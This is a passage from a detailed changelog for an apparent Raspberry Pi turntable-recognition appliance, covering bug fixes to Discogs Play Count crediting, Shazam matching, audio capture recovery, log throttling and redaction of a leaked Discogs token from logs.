  surfacing, and a settled-palette fix (#206 / #207 / #208 — Wave 5 bundle 5).**
  - **#206 (disp-1, MEDIUM):** the status-strip labels ("NOW PLAYING",
    "SIDE A · NN OF MM") are drawn in `muted` on the SOLID surface bar, but
    `muted` was contrast-clamped only against the darker gradient-text peak, so on
    most covers the labels measured ≈3.6–4.4:1 — below the WCAG AA 4.5:1 floor
    the design commits to — for the entire record. `muted` is now clamped against
    `surface` itself (the brightest thing it lands on) in both `extract_palette`
    and the lerp re-clamp `_quantize_palette`, which subsumes the gradient-card
    guarantee and brightens secondary text everywhere (Lane-approved global
    brightening, 2026-08-10); `accent` — the album title, drawn only on the
    gradient card — stays clamped on the gradient peak. New tests assert
    muted-vs-surface ≥ 4.5 on both paths, including bright/cream covers.
  - **#207 (arch-6, LOW):** `DisplayRenderer._spawn`'s done-callback discarded the
    task ref but never retrieved its exception, so a raise escaping a display
    background task surfaced only as a detached GC-time "Task exception was never
    retrieved" with no context (the tracker's CONC-3 registry already handles this
    correctly). The callback now discards, skips cancellation, and logs the
    retrieved exception.
  - **#208 (disp-2, LOW):** on a transition into a static screen (IDLE, ERROR, or
    now-playing under `reduced_motion`) the render loop went quiet ~1ms before the
    palette lerp reached its exact target, so the screen permanently held the
    QUANTIZED lerp palette — e.g. background `(0,0,0)` instead of the intended
    `(10,10,10)` the design's 8–10 floor guarantees. `run()` now forces one final
    frame on the transition's True→False edge, composing the exact target palette.

- **The transient/permanent error taxonomy is now honoured end-to-end
  (#188/#189/#190 — MEDIUM, Wave 2 bundle 1).** Three sites computed the
  transient-vs-permanent verdict and then discarded or misrouted it:
  - **#189 (`is_transient` status discrimination):** the classifier blanket-
    treated every `requests.HTTPError` and `discogs_client` HTTPError as
    transient, so a revoked Discogs token (401), wrong username (404), or
    malformed request (400) logged only as INFO "(transient)" — indistinguish-
    able from a wifi blip, hiding a dead credential that silently stopped all
    Play Count accrual. `is_transient` now judges HTTP errors BY STATUS
    (408/429/5xx transient; every other status permanent); status-less
    connection/timeout/NetworkError keep the family classification. The
    resolver escalates a permanent 401/403/404 to an ACTIONABLE `ERROR`
    naming the fix ("check your Discogs user_token" / "check your
    discogs.username"), logged once and throttled per-tier until that tier's
    lookup next succeeds (clockless, cf. #178). Permanent auth errors stay uncached/
    retryable — no downgrade is pinned (B-4), so accrual resumes the moment
    the token is fixed.
  - **#188 (`_build_result` transient swallow):** a transient 429/5xx during
    the lazy release fetch (tracklist, master year, images) was caught
    per-field and the degraded result (no cover, empty tracklist → no
    `is_last_track` → no Play Count) was cached session-long as a Discogs hit.
    A new `_reraise_if_transient` propagates transient failures from the
    CREDIT-CRITICAL enrichment sites (`_build_result`'s release-load per-field
    guards and `get_tracklist`) to the resolve boundary so the album stays
    uncached/retryable; permanent/malformed data still degrades that field.
    `search_database`'s per-candidate catch re-raises transient too, so the
    bug can't just move one tier down (a "clean miss" the resolver would cache
    as FALLBACK). Deliberate carve-out (cold review): `get_original_year`
    DEGRADES transient to the pressing year rather than propagating — it is
    display-only with a valid fallback, and re-raising would discard an
    otherwise credit-capable result over a decorative field. Mirrors the
    established #175 pattern.
  - **#190 (cover-art transient flattened to None):** `CoverArtFallback`'s
    outer handler returned `None` for both a transient MusicBrainz outage and
    a clean "no art exists", and `resolve()` cached that `None` as the album's
    FALLBACK payload for the session — pinning an album coverless even after
    MusicBrainz recovered. The outer handler now re-raises transient (keeps
    catch-and-None for permanent), and `resolve()` Step 3 mirrors the
    `discogs_completed` pattern: on a transient cover-art failure it returns
    the fallback for this track but skips the cache. A clean "no art" still
    caches (load-bearing for MusicBrainz rate limits).

- **A transient blip on an album's first resolve no longer causes a spurious
  session split (#184 — MEDIUM, `R4:gap3-1`).** The B-4 carve-out
  deliberately returns a DATABASE-tier result *uncached* after a transient
  collection-tier error, so the next track retries and resolves to the OWNED
  pressing — a different release id. The split detector's documented premise
  ("every track of an album resolves to identical release IDs within a
  session") was revoked by exactly that carve-out: one 429/network blip on
  track 1 split the session, and in the closer-first case silently lost the
  Play Count. The resolver now threads its normalised cache key onto every
  track (`TrackMetadata.resolve_key` — RAW Shazam strings, not the
  cross-pressing Discogs album title), the session records the source and
  key alongside `last_release_id`, and the detector suppresses the split
  for the asymmetric tier upgrade only: last id DATABASE-sourced, incoming
  COLLECTION-sourced, same key. Genuine swaps (different key), keyless
  tracks, and the collection→database direction all still split
  (each pinned by a direct test, including the DATABASE-source conjunct,
  which is near-equivalent in production today but must not be silently
  droppable). The module docstring's revoked guarantee is corrected, and so
  is `docs/architecture.md`'s copy of it. Accepted residuals: a DB-sourced
  closer's `is_last_track` derives from the DB pressing's tracklist
  (conservative-miss direction), and the degraded DB row is not #182
  support — a short album needs two collection-resolved rows after the blip
  to credit (identical outcome to the pre-#184 baseline, executed).

- **Re-dropping the same record inside the silence window now credits both
  playthroughs (#185 — LOW, `R4:data-4`).** The auto-split's only trigger
  was a *differing* release id, so an immediate replay (equal ids) merged
  two complete playthroughs into one session and one credit. The album's
  OPENER (resolved tracklist row 0) arriving after `potential_last_track`
  armed — and not a consecutive re-identification of the last logged track —
  is now a replay boundary: the session splits exactly like a record change,
  the finished playthrough credits (and loves) at the boundary, and the
  replay earns its own session. Opener-only deliberately: the cold review
  executed a double credit under a looser any-same-release-track trigger (a
  stale mid-album re-identification split + credited, then the still-playing
  closer's own re-identification re-armed the remainder past the #182 gate)
  — that sequence is regression-pinned to a single credit. Release-less
  (FALLBACK) tracks still never trigger splits, preserving #181's no-split
  love-target path. Accepted conservative residuals, pinned or documented:
  a re-drop straight into a later track (side-B replay) still merges — the
  old undercount, for that slice only; a replay of a wholly DB-degraded
  playthrough is absorbed by the #184 suppression (at most one lost Last.fm
  love; the degraded playthrough was uncreditable anyway); and one KNOWN
  phantom (#227, accepted with Lane): a reprise/bookend closer whose tail
  Shazam-resolves to the opener's row can trip the boundary with no real
  re-drop and double-credit — a genuine re-drop and this case both yield a
  2-row remainder, so it is documented rather than fixed.

- **Recognition is gated on the music verdict; a low-gain session can no longer
  become immortal (#193 + #195 + #196 — Wave 3 bundle 1).** Three linked
  recognition/session-lifecycle findings, fixed together because the first two
  share a root cause:
  - **#193 (stab-1, HIGH):** `AudioCapture` enqueued EVERY assembled chunk for
    Shazam recognition unconditionally — silence included — so an idle turntable
    POSTed to Shazam's unofficial API on every hop, ~8,640×/day forever (pure
    waste, and a fixed-cadence 24/7 traffic profile that risks the endpoint
    throttling or blocking recognition when music actually plays). Recognition is
    now gated on the already-computed music verdict: a new `_dispatch_chunk`
    still runs silence classification on every chunk (it drives the lifecycle)
    but only enqueues for recognition while `SilenceDetector.is_music_playing`.
  - **#195 (conc-3, MEDIUM):** because recognition ran ungated, sub-threshold
    audio (a mis-set capture gain — RMS below `silence_threshold_rms`, at which
    Shazam still identifies) could confirm tracks and start a tracker session
    while the detector never left silence-state — so `_silence_since` was never
    armed, `SESSION_ENDED` could NEVER fire, and the session was immortal: the
    card stuck on screen forever and the album's Play Count / Last Played / love
    were silently never written, while the box LOOKED like it worked. The same
    gate fixes this structurally — a session can only start off a recognized
    track, hence only in music-state, so the music→silence transition that ends
    it is always reachable. Sub-threshold audio is now treated as silence and
    surfaced by a throttled low-gain WARNING (audio persistently in
    `[threshold*0.25, threshold)` for ≥60s, re-logged ≤ every 300s — the #178
    flood-guard pattern) so a miscalibrated preamp is visible, not invisible.
    Two defence-in-depth backstops complete it: a **wall-clock max-session
    safety** — after `_MAX_MUSIC_SECONDS` (60 min) of CONTINUOUS music the
    detector force-emits `SESSION_ENDED`, so a **locked groove / stuck input**
    (RMS never falls, so the normal music→silence transition never fires) still
    credits the side; and a **recognized-in-silence tripwire** — since the gate
    makes `MUSIC_STARTED` always precede recognition, `on_track_identified`
    having to create the session itself is the immortal-session signature, so it
    logs a loud WARNING (the session still starts, so no play is lost).
  - **#196 (conc-4, LOW):** on the stale-discard race (the session ends while
    `on_track_identified` is in flight), `commit()` fell through to the "Now
    playing" log and returned `True`, contradicting its documented "returns
    False when discarded" contract — a misleading journal line during exactly
    the races one would be debugging, and a latent trap for any future caller
    that trusts the boolean. It now takes the same epoch-discard exit as the
    post-resolve path (log a discard line, `return False`) before the now-playing
    log. The existing B-1/B-19/LB-1 epoch, `current_raw`, and scrobble guards are
    unchanged; the happy path is byte-for-byte identical.

- **Capture recovers a hot-plugged audio device, and recognition failures no
  longer flood the journal (#194 + #197 — Wave 3 bundle 2).** Two
  recognition/hardware-lifecycle findings on the real Pi:
  - **#194 (conc-1, MEDIUM):** #164 moved the device lookup inside the rebuild
    loop and its comment promised late-enumeration / re-plug recovery — but the
    lookup reads PortAudio's device table, which is frozen once at
    `import sounddevice` (Pa_Initialize) and **never** rescans, so every retry
    saw the identical stale snapshot. A UCA222 still USB-enumerating when systemd
    (ordered only on `network.target`, CRIT-4/#83) starts the service, or a
    mid-run unplug→replug to a different ALSA card index after a CONC-5 stall,
    left capture an **alive-but-idle zombie** until a human restarted the
    process — no crash loop, so systemd never intervened. The rebuild loop's
    failure handler now calls `sd._terminate(); sd._initialize()`
    (`_refresh_audio_devices`) — python-sounddevice's documented rescan recipe —
    before the next attempt, so a device that appeared or moved is actually
    picked up. It runs **only** on the failure path and never against a live
    stream: if `InputStream` opened but `__enter__`/`start()` then raised (a
    brown-out in the open→start window), `with` never runs `__exit__`, so the
    still-open stream is closed first (`_terminate()` on a live stream is
    undefined behaviour — second cold-review catch). Both are private APIs
    (pinned sounddevice 0.5.5), wrapped so an upstream refactor degrades to the
    pre-#194 behaviour instead of crashing the loop. The unit test that falsely
    pinned this recovery — green only because its `query_devices` mock returned a
    different list on the second call, exactly what the frozen table cannot do —
    now asserts the refresh happens *between* the failed and successful lookups.
  - **#197 (err-5, LOW):** the per-chunk `ShazamIO recognition failed` WARNING
    was unthrottled. Recognition is attempted every ~10s hop, 24/7, so a
    sustained network outage wrote ~8,640 identical lines/day — the flood class
    #178 / PCONC-4 already throttle on the capture leg — drowning the journal and
    amplifying SD-card writes. **Both** failure legs are now rate-limited through
    a shared `ThrottledLogger` (the #178 pattern, extracted to
    `src/audio/log_throttle.py`): the fast-fail `except` in
    `ShazamIOBackend.recognize` (connection-refused / DNS) **and** `run()`'s
    loop-error `ERROR` — where a HANGING outage lands instead, cancelled by the
    `recognize_timeout` `wait_for` *before* the backend's own `except` can log
    (~2,700 lines/day). First occurrence and any changed message log immediately;
    identical repeats summarise at most once per 60s; a full success (transport
    **and** parse — a transport-only reset would let a persistent malformed
    response re-flood, second cold-review catch) flushes the streak with a
    recovery tally.

- **A fresh install no longer dies silently on the current default Pi OS image,
  and the Discogs check script resolves config from the repo root (#198 + #204 —
  Wave 4 bundle 3).**
  - **#198 (ops-1, HIGH):** Raspberry Pi Imager's default "Raspberry Pi OS
    (64-bit)" now flashes Trixie (Python 3.13), where PEP 594 removed the stdlib
    `audioop` module that shazamio's `pydub` dependency imports — so `pip install`
    succeeded but `import shazamio` failed at runtime, surfacing only as a
    per-chunk recognition miss (display latched to NO MATCH FOUND) while systemd
    saw a healthy service. Fixed in three layers: `requirements.txt` now pulls in
    the `audioop-lts` backport on Python 3.13+ (so the default image works);
    `docs/pi-setup-guide.md` documents the nested "Raspberry Pi OS (Legacy,
    64-bit)"/Bookworm option and adds a `python3 --version` check; and `main.py`
    eagerly probes `import shazamio` at startup (gated on the shazamio backend),
    turning a broken install into an actionable `ConfigError` + non-zero exit that
    systemd surfaces instead of the silent per-chunk miss. The lazy import in
    `recognizer.py` (the A-13 testability seam) is unchanged.
  - **#204 (gap2-3, LOW):** `scripts/discogs_live_check.py` fixed `sys.path` from
    the repo root but called `load_config()` with its CWD-relative default, so
    running it from anywhere but the repo root failed with a misleading
    "config.yaml not found" for an operator whose config already existed. It now
    loads `config.yaml` from the repo root it already computes.

- **First-boot docs and the Discogs check script corrected for the current Pi OS
  stack (#199 / #200 / #201 / #205 — Wave 4 bundle 4).**
  - **#199 (gap2-1, MEDIUM):** `scripts/discogs_live_check.py` verified only the
    Play Count custom field, so a case-slip in `last_played_field_name` ("Last
    played" vs "Last Played") passed every check green and then silently failed on
    every session end. The field-map check now covers Last Played too (marking
    each write target distinctly), fails on a mismatch with the same
    case-sensitivity hint, and notes the field when it's intentionally unset.
  - **#200 (ops-2, MEDIUM):** the display and screen-blanking instructions
    targeted the legacy X11/firmware stack — inert on every image the guide can
    flash (Trixie now, Bookworm as Legacy — both KMS/Wayland). §3 now leads with
    EDID auto-negotiation verified via `wlr-randr`/`kmsprint` (not `xrandr`, which
    shows only an XWAYLAND virtual output) and gives the KMS fallback
    `video=HDMI-A-1:1024x600M@60D` in `/boot/firmware/cmdline.txt`; screen
    blanking is disabled via raspi-config (the `xset`/LXDE recipe kept only as an
    X11 footnote); and the systemd unit carries a Wayland/`XAUTHORITY` bring-up
    caveat.
  - **#201 (ops-3, MEDIUM):** the troubleshooting remedy for the boot-time session
    race — `After=graphical-session.target` in a *system* unit — is a verified
    no-op (that target exists only in the per-user manager). The unit's retry
    window is widened to `RestartSec=15` + `StartLimitBurst=10` (~2.5 min of
    session bring-up vs the old ~50s) so a slow cold boot recovers on its own,
    while a genuinely broken boot still trips the limit; the troubleshooting entry
    now explains the no-op and the real remedies.
  - **#205 (ops-4, LOW):** the guide and `get_lastfm_session_key.py`'s docstring
    still described the pre-S-3 "prints the session key to the terminal"
    behaviour; the script now writes a 0600 file. Both are updated to match (write
    the file → paste its contents → delete it).

- **An ambiguous Play Count write can no longer double-credit one play
  (#186 — HIGH, `R4:data-1`, Wave 2 bundle 2).** The #163 bounded finalize
  retry re-ran the WHOLE read-modify-write on each attempt: read current →
  POST current+1. On flaky Pi Wi-Fi an AMBIGUOUS first POST — applied
  server-side but its response lost to a timeout — made the retry re-read the
  ALREADY-incremented value and increment AGAIN, so one completed play added
  **+2** (executed repro: a record at 5 ended at 7, not 6). The write path is
  now SPLIT into an idempotent read-then-set: `DiscogsCollectionWriter`
  exposes `read_play_count` (returns the current int, `0` for a
  confirmed-blank field, or `None` to abort — preserving META-1 "unreadable ≠
  0" and META-2 "don't clobber a non-integer") and `set_play_count` (an
  idempotent absolute POST, `retry_on_429=True`). The tracker reads the value
  ONCE (bounded-retrying only the SAFE GET, via a new `_read_value_with_retry`
  that treats `0` as valid and only `None` as retryable), then bounded-retries
  ONLY the absolute set of `current+1` — re-POSTing a fixed value lands the
  field at that value whether or not a prior POST applied (mirrors the proven
  B-15 429-retry idempotency). `increment_play_count` remains as a single-shot
  `read_play_count` + `set_play_count` convenience. Credit is committed
  (`credited=True`) only after the set lands; an untrusted read aborts with
  nothing written and the loss logged loudly. Accepted residual: if the FINAL
  retry's response is ALSO lost, the set may have landed while we log LOST and
  leave `credited` False — an irreducible ambiguity without a read-back
  (follow-up filed), but never a double-credit.

- **A creditable album-split finalize now survives shutdown cancellation
  (#187 — MEDIUM, `R4:data-2`, Wave 2 bundle 2).** The rare creditable split
  (a record's closer plays right before the swap to another record) finalized
  its credit AWAITED INLINE in the recognition leg — which `run_pipeline`
  cancels on shutdown BEFORE `tracker.drain()` runs, and `drain()` only covers
  the `_bg_tasks` (SESSION_ENDED) tasks — so a `CancelledError` (a
  `BaseException`, uncaught by the credit's `except Exception`) tore the write
  in half. The split credit is now registered as a `_bg_tasks` task (so
  `drain()` awaits it) and awaited under `asyncio.shield`. A plain `await task`
  does **not** protect the task — cancelling the awaiter propagates to the task
  it is blocked on via `Task._fut_waiter`, cancelling the credit too (this was
  the first cut, and its RED test caught it before commit); `asyncio.shield`
  decouples them, so on shutdown the inline await unwinds while the shielded
  credit keeps running for `drain()` to complete. shield still propagates a
  genuine finalize raise out of `on_track_identified` (LB-1: `current_raw`
  stays un-advanced), and `_on_end_session_done` tolerates the double-retrieval.

- **Stale post-#61 rate-limit comments and an overclaiming 429 log corrected
  (#192 — LOW, `R4:err-2`, Wave 2 bundle 2).** The transport's
  `_RATE_LIMIT_MAX_WAIT` rationale still described `request()` as running on
  the SHARED `run_in_executor(None,…)` pool "that also serves cover downloads
  and Last.fm scrobbles" — false since #61 moved Discogs to a DEDICATED
  two-worker pool; the comment now explains the cap in terms of not parking one
  of only two discogs workers plus the META-10 "a retry inside the cap lands in
  the same throttle window" logic, and drops the "deferred to #61" language for
  work #61 already did. The two 429-skip ERROR logs claimed "its caller has no
  further retry, so the write (e.g. a Play Count credit) may be lost" — false
  for exactly the example cited: the Play Count credit IS bounded-retried by
  the finalize layer (#163/#186). The logs now state accurately that idempotent
  writes are re-issued by their caller while a single-shot write (e.g.
  `update_last_played`) with no caller retry is the one genuinely lost.

- **Records added to Discogs during a long uptime are now credited without a
  restart (#191 — MEDIUM, `R4:stab-2`, Wave 2 bundle 3).** The collection index
  and the resolver's album cache were held for the whole process lifetime on a
  "restarts daily" premise that nothing implemented — the appliance runs 24/7.
  So on a multi-week uptime the index was frozen at a boot-time snapshot: a
  record bought, added to Discogs, and played that evening missed the stale
  index (both `search_collection` strategies), resolved via the database tier,
  and was cached as a DATABASE-tier downgrade with **no `instance_id`** and no
  TTL — every subsequent play silently uncredited until a reboot (the B-4/B-13
  retry machinery can't help; it's a clean "not owned", not a transient error).
  Fixed with a **B+C hybrid**, all in-memory (no disk — #169's wrong-write-target
  concern stands and is untouched):
  - **B1** — the collection index gets a monotonic-clock TTL
    (`_COLLECTION_INDEX_TTL_SECONDS`, 12h): past the TTL it rebuilds from the
    API on next access. `monotonic` (not wall-clock) is deliberate — reboot-safe,
    and a reboot rebuilds anyway.
  - **B2** — the resolver's album cache expires **DATABASE/FALLBACK** entries
    after `_DOWNGRADE_TTL_SECONDS` (1h); **COLLECTION** hits are correct and
    never expire. This is the load-bearing half the naïve "just TTL the index"
    fix misses: without it, a previously-downgraded album stays pinned in the
    Step-0 cache and never re-reaches the lookup chain.
  - **C** — on a *clean* collection miss whose album the Discogs database DOES
    know (the signature of a just-added record), the reader force-refreshes the
    index (behind `_INDEX_REFRESH_COOLDOWN_SECONDS`, 15min) and re-checks
    ownership, crediting via COLLECTION on that very play instead of pinning the
    downgrade. The cooldown is load-bearing: the same signal fires on every
    genuinely-unowned record, so it bounds the speculative re-page. C is gated on
    a clean miss — a collection *error* leaves the album uncached/retryable (B-4)
    and never triggers a refresh. The three stale "restarts daily" docstrings
    (`reader.py`, `resolver.py`, `cover_cache.py`) are corrected. Follow-ups
    filed: #230 (periodic cover-cache `.part` sweep for the no-restart appliance).

- **The Last.fm love now targets the album's closer, not the last track
  identified (#181 — MEDIUM, `R4:data-3`).** `_finalize_session` recomputed
  the love target as `identified_tracks[-1]`, which equals the closer only if
  nothing was identified after it. Two realistic sequences broke that
  (executed repros): re-dropping side A within the 45s silence window (same
  release id, no album split — the replayed opener got loved), and a
  FALLBACK-resolved record swap (no release id, split can't trigger — a
  track of a *different record and artist* got loved on the operator's real
  Last.fm profile). `PlaySession` now records `closing_track` — the exact
  track whose `is_last_track` armed `potential_last_track` — and the love
  targets it, with `identified_tracks[-1]` retained only as a fallback for
  sessions armed without a recorded closer (behaviour-identical for normal
  completions, mutation-pinned in both directions).

- **SideIndex now matches Shazam titles against Discogs tracklist rows with
  tiered normalisation (#180 — HIGH, `R4:gap1-2`).** The old
  ``lower().strip()`` exact equality missed every routinely-decorated Shazam
  title ("Eclipse - 2011 Remastered Version" vs a tracklist row "Eclipse",
  "(Remastered 2009)", "(feat. X)", typographic apostrophes, NFD accents,
  "&" vs "and") — 12 of the 13-case realistic-divergence regression corpus
  miss on the old comparator (executed; only the bare case/whitespace pair
  matched) — silently forfeiting the album-completion Play Count, Last Played, and
  Last.fm love for flawless full-album plays, while blanking the side caption
  and logging a line that blamed the listener. Matching is now tier 1 exact
  equality of losslessly folded text (shared helper
  `src/metadata/normalize.py`: punctuation fold before AND after NFKC,
  casefold, whitespace collapse, "&"→"and"), tier 2 a keyword-gated trailing
  decoration strip (parenthetical or dash suffix) applied one side at a time
  and only accepted on a UNIQUE folded title across the tracklist —
  ambiguity keeps the conservative `SideIndex.empty`, so the META-4/#78
  phantom-last-track class cannot resurface, and a reprise (same folded
  title twice) still resolves to its first occurrence (B-5). All three
  comparison sites in `from_tracklist` share one matcher, so side ordinal,
  global index, and neighbours cannot desync. The cold review caught — and a
  contested-base refusal now prevents — a phantom-credit regression: a row
  whose decoration diverges from the query's only in SYNTAX (row "Song
  (Demo)", Shazam "Song - Demo") is invisible to the one-side branches, and
  the matcher would otherwise confidently pick the plain twin row, arming a
  phantom `is_last_track` when the twin is the closer; when any row outside
  the accepted group shares the query's stripped base, the matcher refuses
  (regression-pinned). The contested scan uses a refusal-only fixpoint base
  (`decoration_base`) that also sees square-bracket and stacked decoration
  grammar the single-strip matcher cannot, so "Song [Demo]" and "Song (Demo)
  (Live)" siblings contest too (second-pass catch, regression-pinned).
  Accepted residuals, all conservative misses pinned in the corpus: reworded
  titles ("Pt. 2" vs "Part Two"), square-bracket decorations on the QUERY
  side ("Song [Live]"), and stacked double decorations on the query side.
  `RecognitionLoop._same_track` is deliberately untouched (Shazam-to-Shazam
  comparison needs no decoration logic).

- **Collection strategy 1 validates the candidate against the recognition
  before accepting it (#183 — MEDIUM, `R4:gap1-4`).** Strategy 1 fetched up
  to 25 loose-search candidates and returned the FIRST whose release id was
  in the collection index — ownership was the only criterion, the title never
  compared. Discogs' q= relevance ranking freely interleaves similar-titled
  releases, so playing a borrowed "Greatest Hits" while owning "Greatest
  Hits II" credited GH II whenever it outranked the right pressing, with no
  distinguishing log line. Strategy 1 now requires an exact normalised
  title + artist match against the candidate's clean INDEX entry (sharing
  #179's keys and " (n)" artist-suffix rule); mismatched owned candidates
  are skipped with a debug line and the scan continues — an early abort
  would silently lose multi-pressing collections, where strategy 2's
  uniqueness rule refuses the same-title pair (mutation-pinned). Anything
  fuzzier defers to strategy 2, the single authority for tiered matching
  and refuse-to-guess. Among exact matches, relevance order still picks the
  pressing (unchanged). Because the old ownership-only strategy 1 was the
  last path that bridged artist-name string divergence, exactness would have
  silently lost every play by affected artists (cold-review catch, executed:
  "Rolling Stones" vs an indexed "The Rolling Stones") — so #223's
  conservative artist folding ships here in the now-shared artist rule
  (`_normalize_artist`: fold "&"→"and", strip one leading "the"; artist
  names ONLY, never titles — "The Wall" ≠ "Wall", regression-pinned), and
  tier 2's trailing-qualifier strip also accepts the iTunes square-bracket
  form ("Rumours [Deluxe Edition]"). Documented conservative-miss residuals,
  pinned: stacked decorations ("Pet Sounds (Mono) (Remastered)"), truly
  divergent artist names ("The Charlatans UK"), and distinct
  bracket-vs-paren siblings are still never equated.

- **Collection strategy 2 no longer matches by bare substring containment
  (#179 — HIGH, `R4:gap1-1`).** The old fuzzy match (`album_lower in title`,
  artist likewise), walking the index most-recently-added-first, could select
  the WRONG owned record as the Play Count / Last Played write target
  (executed repros: "Led Zeppelin II" credited to an owned *III*; War's "War"
  credited to an owned Warpaint "Warpaint"; self-titled families silently
  resolved to the newest addition) and missed exactly-owned records on
  decorated Shazam titles ("Rumours (Deluxe Edition)" never matched an owned
  "Rumours"). Strategy 2 is now tiered exact-first on normalised strings
  (typographic-punctuation fold before NFKC, casefold, whitespace collapse;
  Discogs `" (n)"` artist-disambiguation suffix stripped from index names),
  with a tier-2 retry that strips a trailing parenthetical from **one side at
  a time** — the cold review caught that a both-sides strip would equate
  distinct parenthetical siblings ("Live (1975)" vs an owned "Live (1980)"),
  an introduced wrong-write regression, and it is regression-pinned. Either
  tier must identify a unique owned entry; on ambiguity the matcher refuses
  to guess (SEC-1 principle) and the track degrades to the database tier (no
  write target). Known accepted residual, documented at the strip regex: a
  decorated query can still credit an owned plain-titled member of a family
  distinguished only by parentheticals (the Discogs "Weezer"-×4 case) —
  uniqueness protects only when 2+ owned members match under the one-side
  strip; follow-up filed for a decoration-keyword allowlist. Behaviour note:
  exact artist matching is stricter than the old containment; the common
  variant classes ("Rolling Stones" vs "The Rolling Stones", "&" vs "and")
  are folded by #223's `_normalize_artist` (shipped with #183, below), while
  truly divergent names ("The Charlatans" vs "The Charlatans UK") still miss
  (fail-safe: no write target rather than a guessed one).

### Security

- **The Discogs user token can no longer leak into the journal or the setup
  terminal (#202 + #203 — Wave 4 bundle 3).** `python3-discogs-client`
  authenticates by putting the token in the request URL's query string (unlike
  the app's own header-auth transport), so a routine network blip raised a
  `requests` error whose text embedded `token=<the real write-capable token>`.
  - **#202 (sec-1, MEDIUM):** that exception was logged verbatim by the resolver
    (×4) and reader (×1), persisting in the systemd journal across reboots and
    bypassing `transport._redact_url` (which only guards the header-auth
    transport). A redacting `logging.Filter` is now installed on the root log
    HANDLER at startup — scrubbing the four known credentials by exact match plus
    a `token=[^&\s]+` regex and rewriting the record so `%`-formatting can't
    reintroduce the secret; a record that can't render is dropped rather than
    handed to `handleError` (which would dump raw args). The now-false "never the
    URL" claim in `transport._redact_url`'s docstring is corrected.
  - **#203 (gap2-2, LOW):** the same token could reach the setup terminal,
    scrollback, or a screen recording via `discogs_live_check.py`'s
    `Exception: {e}` prints and the library's stderr warnings. The script now
    redacts `token=` on every exception print and installs a redacting filter for
    the stderr sink.

## [1.5.7] — 2026-08-07

**Code-review follow-ups, round 3 (Waves 6–10).** The residuals surfaced by
earlier waves' cold reviews, filed as GitHub issues and cleared here: first the
paths that decide whether the appliance comes up at all (Wave 6 — boot & config
correctness), then hardening how malformed or failing external responses degrade
(Wave 7 — Shazam/MusicBrainz/Last.fm), a couple of display/concurrency residuals
(Wave 8), a cleanup / test-infra sweep (Wave 9), and two design-gated items
assessed and documented as deliberate deferrals (Wave 10 — the cover-fetch
header-drip residual and Discogs index persistence). This closes the round-3
audit's follow-up backlog.

### Added

- **Global per-test timeout via `pytest-timeout` (#174 — LOW).** The suite had
  no bounded per-test timeout, so an infinite-loop regression (e.g. a broken
  cache-eviction loop) would hang CI or a local run indefinitely rather than
  failing red in seconds — the mutation harness only caught such loops because it
  wraps each run in an external `timeout`. Added `pytest-timeout` to
  `requirements.txt` and a generous `timeout = 60` global in `pytest.ini` (every
  real test runs in well under a second, so it never false-trips; the signal
  method interrupts a wedged pure-Python loop on CI and the Pi). A guard test
  pins that the global stays configured — if the `pytest.ini` line is removed or
  the plugin is dropped from the env, it fails loudly.

### Fixed

- **Audio capture no longer crash-loops when the device is absent at startup
  (#164 — MEDIUM).** `AudioCapture.run()` resolved the sounddevice index by
  calling `_find_device_index()` at the very top of the method, *above*
  `self._running = True` and the `while self._running` retry loop and outside any
  `try`. A mistyped `audio.device_name`, or a USB interface (the UCA222) not yet
  enumerated when the service starts, made that raise `ValueError`, which escaped
  `run()`, faulted the capture task, and exited the process — a permanent 10s
  crash loop under the documented systemd unit (`Restart=on-failure`,
  `RestartSec=10`). The lookup now runs *inside* the retry loop's `try`, so an
  absent device degrades to the same backoff-and-rebuild path a stream
  construction failure or a CONC-5 stall already take, and re-resolving on each
  attempt also picks up a device that reappears on a different index after a
  re-plug. RED-first; mutation-verified; independently cold-reviewed. Because the
  lookup now runs on every rebuild, its "using device" INFO and multi-match
  WARNING are deduped (the former keyed on the winning index, the latter on the
  match set) so a sustained rebuild loop can't reintroduce the PCONC-4 log flood
  — a re-plug to a new index, or a newly-ambiguous config, still logs. (Accepted
  trade-off of retry-over-crash: a *permanently* misconfigured `device_name` now
  logs one capture-error per retry backoff (~1/s) via the pre-existing error
  path, versus one per systemd restart (~1/10s) before; the retry is the point,
  and the rate is bounded by `_STREAM_RETRY_BACKOFF_SECONDS`.)
- **`session_end_silence_seconds` is now domain-validated (#168 — LOW).**
  `AudioConfig.from_dict` ran value-domain checks for `sample_rate`,
  `chunk_seconds`, `overlap_seconds`, `width`/`height`, `poll_interval_seconds`,
  `confirmation_required` and `error_after_misses` (CRIT-1), but the sweep missed
  `session_end_silence_seconds`. A config with `session_end_silence_seconds: 0`
  (or negative) passed validation and then fired `SESSION_ENDED` on the first
  silence tick after any `MUSIC_STOPPED` — ending the session and crediting the
  Play Count essentially the moment the music paused. It is now rejected with a
  `must be > 0` message in the same aggregated `ConfigError` block as its
  siblings (`None`-guarded so an upstream type error still surfaces as a friendly
  `ConfigError`, never a raw `TypeError`). RED-first; mutation-verified.
- **A non-dict Shazam `track` is now a clean no-match (#167 — LOW).** A response
  whose `track` is present but not a dict (e.g. a JSON list) made
  `_parse_shazam`'s `track.get(...)` reads raise `AttributeError`, which escaped
  the pure parser to `recognize()`'s broad `except` and was logged as a
  misleading "recognition failed" WARNING before the (correct) miss. It now
  returns `None` cleanly via an `isinstance(track, dict)` guard. The null-*container*
  shapes #167 also enumerated (null `sections`/`metadata`, null list entries)
  were verified already handled by the REC-5 `or []` guards + album `try/except`
  — reproduced all five shapes before touching code, so this completes the issue
  with the one guard that was still missing rather than re-hardening covered
  paths. RED-first; mutation-verified.
- **A raising Discogs credit no longer skips the Last.fm love (#171 — LOW).**
  `_finalize_session` promises the love "runs independently of Discogs — a
  Discogs failure doesn't prevent this," which held when a writer RETURNED False
  but not when it RAISED: the single, unretried `update_last_played` raising
  propagated out of `_credit_completed_album` and `_finalize_session` *before*
  the love block, so a Discogs transport error silently cost the love too. The
  crediting call is now wrapped so a raise is logged and contained, and the love
  still runs (`credited` stays uncommitted, so a genuinely lost credit is still
  not falsely latched). The CONC-3 done-callback — which previously used this
  exact raise as its reachable vector — now backstops any *other* unexpected
  raise in the SESSION_ENDED task; its docstring and the corresponding test were
  updated to match. RED-first; mutation-verified; independently cold-reviewed
  (SPEC + QUALITY PASS — CancelledError still propagates, B-8 idempotency
  unchanged).
- **MusicBrainz cover-art lookup classifies transport errors transient-vs-
  permanent instead of aborting on all of them (#175 — LOW).** After #115 a
  malformed *payload* on one release skipped to the next candidate, but a
  *transport* error from `get_image_list` on an early release (an
  `AuthenticationError` or a bad value) still escaped the inner handler and
  aborted the whole candidate loop — so a later release that had cover art was
